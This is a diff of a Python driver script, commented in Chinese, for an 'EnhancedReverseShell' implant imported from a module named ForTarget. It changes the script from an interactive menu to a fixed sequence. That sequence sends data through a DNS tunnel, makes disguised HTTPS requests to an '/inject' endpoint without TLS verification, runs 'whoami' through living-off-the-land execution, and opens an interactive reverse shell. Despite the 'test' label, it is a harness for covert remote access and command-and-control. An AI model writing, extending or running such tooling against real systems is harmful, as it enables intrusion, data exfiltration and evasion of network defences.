@@ -1,6 +1,6 @@
 """
 安全测试脚本 - 不修改任何系统文件
-测试：shell会话、DNS隧道、HTTPS伪装、LOTL借壳
+自动依次测试：DNS隧道、DNS查询、HTTPS伪装、LOTL借壳、交互式Shell会话
 """
 from ForTarget import EnhancedReverseShell, DNSConfig, HTTPIsConfig, LOTLConfig
 
@@ -16,7 +16,7 @@ shell = EnhancedReverseShell(
     ),
     https_config=HTTPIsConfig(
         endpoint='/inject',
-        use_tls=False,       # 本地测试不用 TLS
+        use_tls=False,
         verify_ssl=False,
     ),
     lotl_config=LOTLConfig(
@@ -24,44 +24,31 @@ shell = EnhancedReverseShell(
     ),
 )
 
-MENU = """
-========== 安全功能测试 ==========
-1. 交互式 Shell 会话（断线自动重连）
-2. DNS 隧道发送测试（需先在 Mac 启动 dns_tunnel_server.py）
-3. DNS 查询测试
-4. HTTPS 伪装请求测试（需先在 Mac 启动 listener_http.py）
-5. LOTL 借壳执行命令
-0. 退出
-==================================
-"""
+def sep(title: str) -> None:
+    print(f"\n{'='*40}")
+    print(f"  {title}")
+    print('='*40)
 
-while True:
-    print(MENU)
-    choice = input("选择功能: ").strip()
+# 1. DNS 隧道发送
+sep("1/5  DNS 隧道发送")
+ok = shell.send_dns_tunnel("hello from test_safe")
+print(f"[结果] {'成功' if ok else '失败'}")
 
-    if choice == '1':
-        shell.shell_session()
+# 2. DNS 查询
+sep("2/5  DNS 查询")
+result = shell.query_dns()
+print(f"[DNS响应] {result}")
 
-    elif choice == '2':
-        msg = input("输入要通过 DNS 隧道发送的内容: ")
-        ok = shell.send_dns_tunnel(msg)
-        print(f"[结果] {'成功' if ok else '失败'}")
+# 3. HTTPS 伪装请求
+sep("3/5  HTTPS 伪装请求")
+result = shell.camouflage_https("test_safe probe")
+print(f"[HTTPS响应] {result}")
 
-    elif choice == '3':
-        result = shell.query_dns()
-        print(f"[DNS响应] {result}")
+# 4. LOTL 借壳执行
+sep("4/5  LOTL 借壳执行 whoami")
+result = shell.run_lotl_command("whoami")
+print(f"[LOTL输出] {result}")
 
-    elif choice == '4':
-        msg = input("输入要发送的命令内容: ")
-        result = shell.camouflage_https(msg)
-        print(f"[HTTPS响应] {result}")
-
-    elif choice == '5':
-        cmd = input("输入要借壳执行的命令: ")
-        result = shell.run_lotl_command(cmd)
-        print(f"[LOTL输出] {result}")
-
-    elif choice == '0':
-        break
-    else:
-        print("无效输入")
+# 5. 交互式 Shell（放最后，会阻塞直到 Ctrl+C）
+sep("5/5  交互式 Shell 会话（Ctrl+C 退出）")
+shell.shell_session()
